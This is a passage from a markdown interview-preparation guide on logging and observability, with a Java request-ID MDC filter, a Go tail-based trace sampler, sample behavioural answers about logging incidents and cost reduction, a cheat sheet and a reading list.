import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.MDC;

import java.io.IOException;
import java.util.UUID;

public class RequestIdFilter implements Filter {
    public static final String MDC_KEY = "request_id";
    public static final String HEADER  = "X-Request-ID";

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest httpReq = (HttpServletRequest) req;
        HttpServletResponse httpRes = (HttpServletResponse) res;

        String id = httpReq.getHeader(HEADER);
        if (id == null || id.isBlank()) {
            id = UUID.randomUUID().toString();
        }
        MDC.put(MDC_KEY, id);
        httpRes.setHeader(HEADER, id);

        try {
            chain.doFilter(req, res);
        } finally {
            MDC.remove(MDC_KEY);
        }
    }
}
```

Logback pattern uses `%X{request_id}` to render it:

```xml
<pattern>%d{ISO8601} [%X{request_id}] %-5level %logger{36} - %msg%n</pattern>
```

Critical line: the `finally` clear. Without it, the thread returns to the pool with stale MDC.

### Q: Implement a tail-based sampler in 50 lines — keep all traces with at least one ERROR, sample 1% of clean traces

```go
package main

import (
    "crypto/sha256"
    "encoding/binary"
    "fmt"
    "sync"
    "time"
)

type Span struct {
    TraceID  string
    SpanID   string
    Level    string // "info", "error", etc.
    Name     string
    EndTime  time.Time
}

type TailSampler struct {
    mu        sync.Mutex
    buf       map[string][]Span
    deadline  map[string]time.Time
    window    time.Duration
    keepRate  float64
}

func New(window time.Duration, keepRate float64) *TailSampler {
    return &TailSampler{
        buf: map[string][]Span{}, deadline: map[string]time.Time{},
        window: window, keepRate: keepRate,
    }
}

func (s *TailSampler) Add(sp Span) {
    s.mu.Lock()
    defer s.mu.Unlock()
    s.buf[sp.TraceID] = append(s.buf[sp.TraceID], sp)
    s.deadline[sp.TraceID] = time.Now().Add(s.window)
}

// hashFraction maps trace_id to [0,1) deterministically.
func hashFraction(id string) float64 {
    h := sha256.Sum256([]byte(id))
    n := binary.BigEndian.Uint64(h[:8])
    return float64(n) / float64(^uint64(0))
}

// Flush returns the spans we decided to keep.
func (s *TailSampler) Flush() []Span {
    s.mu.Lock()
    defer s.mu.Unlock()
    var out []Span
    now := time.Now()
    for tid, spans := range s.buf {
        if now.Before(s.deadline[tid]) {
            continue
        }
        hasErr := false
        for _, sp := range spans {
            if sp.Level == "error" { hasErr = true; break }
        }
        if hasErr || hashFraction(tid) < s.keepRate {
            out = append(out, spans...)
        }
        delete(s.buf, tid)
        delete(s.deadline, tid)
    }
    return out
}

func main() {
    s := New(100*time.Millisecond, 0.01)
    s.Add(Span{TraceID: "t1", Level: "info"})
    s.Add(Span{TraceID: "t1", Level: "error"})
    s.Add(Span{TraceID: "t2", Level: "info"})
    time.Sleep(200 * time.Millisecond)
    fmt.Println(s.Flush()) // t1 always; t2 only if hash < 0.01
}
```

Key properties: deterministic hash so all spans for a trace share the keep/drop decision; bounded buffer time so memory cannot grow unbounded; error bias keeps the interesting traces.

Production-grade version would: bound total memory, evict oldest on overflow, run flush on a ticker, and emit a `traces_dropped_total` metric.

---

## Behavioral / Experience

### Q: Tell me about a logging incident — too little, too much, or wrong

The interviewer wants to hear that you've been on the wrong side of logging at least once. Strong answers describe:

1. **A specific concrete moment** — not a generality. "On August 12th, our payment service started rejecting cards and we had to read 2GB of unstructured logs to find the smoking gun."
2. **What the log told you (or didn't)** — "we had `ERROR: payment failed` but no error type, no upstream code, no card-type breakdown. Took 3 hours to correlate to a Stripe API change."
3. **What you changed afterward** — "I introduced `error.type` and `error.cause` as required fields, added an integration-test that asserts every error path logs both, and built a `payment_errors_by_type` dashboard."
4. **The blast radius and learning** — "we missed an SLA, paid penalty, and the postmortem owner was me. The lesson: if you can't query it by category, you don't have observability."

Avoid: "we improved logging" with no specifics. Interviewers can smell rehearsed STAR with no real teeth.

### Q: What's a logging convention you've introduced and what was the impact?

A good answer pairs a convention with a measurable outcome:

> "I introduced a 'one access log per request, never one per stage' rule. We had 12 log lines per request from different middlewares — auth, rate-limit, router, body parser, etc. — and our ingest bill was $4k/month with 70% of it duplicated context. After enforcing the rule via a shared SDK that emitted a single structured line at response time, ingest dropped to $900/month, query latency on the dashboard dropped from 8s to 1s, and incident MTTR dropped because operators stopped grepping for the right log line out of 12."

The structure: problem (cost or pain), convention (specific rule), enforcement (code, not just docs), outcome (numbers).

### Q: Have you done a logging cost-reduction project? Walk me through it.

Standard playbook to describe:
1. **Audit** — top 50 log signatures by volume. Usually 80% of cost is in 10 lines.
2. **Categorize** — chatter, debug-leaked-to-info, fan-out, oversize stacks, redundant business events.
3. **Triage** — for each top line, ask: do we need it at all? Can it be a metric? Can it be sampled? Can we shrink the payload?
4. **Implement** — kill the worst offenders in one PR each, measure after each merge.
5. **Govern** — add a "log budget per service" with alerts so it doesn't regress.

Numbers strengthen the answer. "Reduced ingest from 12TB/mo to 3TB/mo; saved $11k/mo; runbooks weren't affected because we kept all ERROR and sampled INFO."

### Q: Describe a privacy-related logging incident or near-miss

This question is about your judgment under pressure. A good answer:

> "A team shipped a feature that logged the full webhook payload for debugging. Two days later we noticed `payment_method.card.number` (full PAN) was in our log index. We were on PCI scope. We disabled the log line, requested log purge from our vendor (took 6 hours), filed a near-miss incident report, retrained the team, and rolled out a SDK-level redactor that masks any field matching credit card regex before serialization."

Don't pretend you've never had a near-miss. Pretending is a red flag — it suggests inexperience or poor introspection.

### Q: A junior keeps logging at WARN for expected business events. How do you handle it?

Pair-debug an incident with them so they see WARN noise drown the real signal. Define "warn" together: "something an operator investigates if rate stays elevated". Refactor one example side-by-side, then add the principle (not a rule) to the team doc. Use code review to ask the question; teach in 1:1 or pairing, not in PR comments.

### Q: Tell me about a time you reduced MTTR by changing how something was logged

Concrete: "We had a 30-minute MTTR for payment failures, mostly spent guessing which downstream caused them. I added `vendor`, `vendor_error_code`, and `retry_attempt` fields to every payment-failure log line, and built a `vendor_error_breakdown` dashboard. Next incident, on-call diagnosed in 4 minutes — same `vendor_error_code` spike pointed straight at the issuer."

Pattern: identify the missing dimension, add it as a structured field, validate the new dashboard catches the case.

### Q: How would you teach an intern about logging in their first month?

Curriculum:
1. **Week 1**: levels, structure, why-not-print, how to read logs in your stack.
2. **Week 2**: pair on an incident review — read real production logs, see what helped, what hurt.
3. **Week 3**: ship a small feature with logging from scratch, paired review on log lines.
4. **Week 4**: read your team's logging standard, audit one service's log emissions, propose one improvement.

Goal: by end of month, intern can write a log line that is useful in an incident without being told what fields to include.

---

## What I'd Ask a Candidate Now

These are meta-questions — the kind a senior interviewer reaches for when they want to see how a candidate thinks under ambiguity. Use them to prep, or to interview others.

### Q: "Show me a log line you wrote this year that you're proud of, and one you regret."

Reveals introspection. Generic candidates say "I always write good logs". Strong candidates can show the diff and explain why one was better.

### Q: "If I gave you root on a service running in prod, how would you find the cause of a 5% error rate spike using only logs?"

Tests querying, correlation thinking, and intuition about what to look for. Good answers grep for ERROR over a 5-minute window, group by `error.type`, slice by `endpoint`, then drill into one example.

### Q: "What's the smallest possible change to logging that would have prevented an incident you remember?"

Tests post-incident thinking. Often the answer is a single field — `vendor`, `tenant`, `version` — that would have shortened diagnosis by 90%.

### Q: "You join a team, look at their logs, and think they're terrible. What do you do in week 1, month 1, quarter 1?"

Tests political and technical judgment. Week 1: observe, don't propose. Month 1: identify the top three pains. Quarter 1: drive a standard with measurable improvement.

### Q: "Defend or refute: 'all logs should be structured JSON, no exceptions'."

Tests opinion-with-nuance. Refutation could include: dev-terminal output is unreadable as JSON; library logs in legacy ecosystems aren't worth migrating; some sinks (syslog) have constraints. Defense: at scale, JSON is the only sane tool; pretty-print at the consumer, never at the producer.

### Q: "Walk me through what happens to one log line from `logger.info(...)` to a dashboard."

Tests end-to-end mental model: in-process logger → formatter → buffer → I/O → stdout → container runtime → log shipper → wire → ingest tier → parser → indexer → query engine → dashboard. Each step has failure modes.

### Q: "What's a logging principle you've changed your mind about?"

Tests intellectual honesty. "I used to think all logs should be at INFO by default; now I think most should be DEBUG and we should be more aggressive about metrics for what we count." Or: "I used to think text logs were fine; one incident at scale changed my mind permanently."

---

## Cheat Sheet

The ten questions most likely to come up, in priority order:

1. **Log vs metric vs trace** — pick one, justify, give a concrete case.
2. **Structured logging** — what it is, why JSON, why ops cares.
3. **Async appender queue full — block/drop/buffer trade-off** — favored trap question.
4. **MDC bleed** — thread-pool reuse, ThreadLocal, clear-in-finally.
5. **DEBUG arg evaluation cost** — why guarded calls or lazy args.
6. **PII in logs** — GDPR, redaction at source, defense in depth.
7. **Head vs tail sampling** — when each is right, OTel Collector for tail.
8. **Log levels** — when to use ERROR vs WARN, the 4xx-as-ERROR trap.
9. **Stack trace fan-out** — dedup, fingerprint, sample.
10. **12-factor logging** — write to stdout, environment ships, no rotation in app.

```
                                LOGGING INTERVIEW DECISION TREE
                                ───────────────────────────────
              Question type?
                 │
       ┌─────────┼─────────┬──────────┬──────────┐
       ▼         ▼         ▼          ▼          ▼
   What is X?  When use? Trade-off?  Design?   Code?
       │         │         │          │          │
       ▼         ▼         ▼          ▼          ▼
   Definition  Pick one  Two options Layered   Concrete
   + example   + reason  + criterion plan      + runs
                                     + risks
```

---

## Further Reading

- Charity Majors et al. — *Observability Engineering* (O'Reilly, 2022). Single best book on metrics/logs/traces and how to think about them together.
- *The Twelve-Factor App* — https://12factor.net/logs
- *The USE Method* (Brendan Gregg) — https://www.brendangregg.com/usemethod.html
- *Structured Logging in Go with slog* — https://go.dev/blog/slog
- *Pino documentation* — https://getpino.io/
- *structlog documentation* — https://www.structlog.org/
- *Logback async appender deep dive* — https://logback.qos.ch/manual/appenders.html#AsyncAppender
- *OpenTelemetry sampling* — https://opentelemetry.io/docs/concepts/sampling/
- *Log4Shell technical analysis* — https://www.lunasec.io/docs/blog/log4j-zero-day/
- *GDPR Article 5* — purpose limitation, storage limitation — https://gdpr-info.eu/art-5-gdpr/
- *Honeycomb blog — high-cardinality observability* — https://www.honeycomb.io/blog
- *Cindy Sridharan — Distributed Systems Observability* (O'Reilly free e-book)
- *Google SRE Book — chapter on monitoring* — https://sre.google/sre-book/monitoring-distributed-systems/

---

## Related Topics

- [Logging — Junior](junior.md) — foundations: levels, print-vs-logger, basic structure
- [Logging — Middle](middle.md) — handlers, structured logs, context propagation in one service
- [Logging — Senior](senior.md) — async pipelines, sampling, MDC, PII redaction
- [Logging — Professional](professional.md) — org-wide standards, cost governance, SLO-driven logging
- [Logging — Tasks](tasks.md) — exercises by level
- [Error Handling — Interview](../error-handling/interview.md) — how errors and logs interact
- [Debugging — Interview](../debugging/interview.md) — using logs to diagnose
- [Logging — README](README.md) — topic overview and learning path
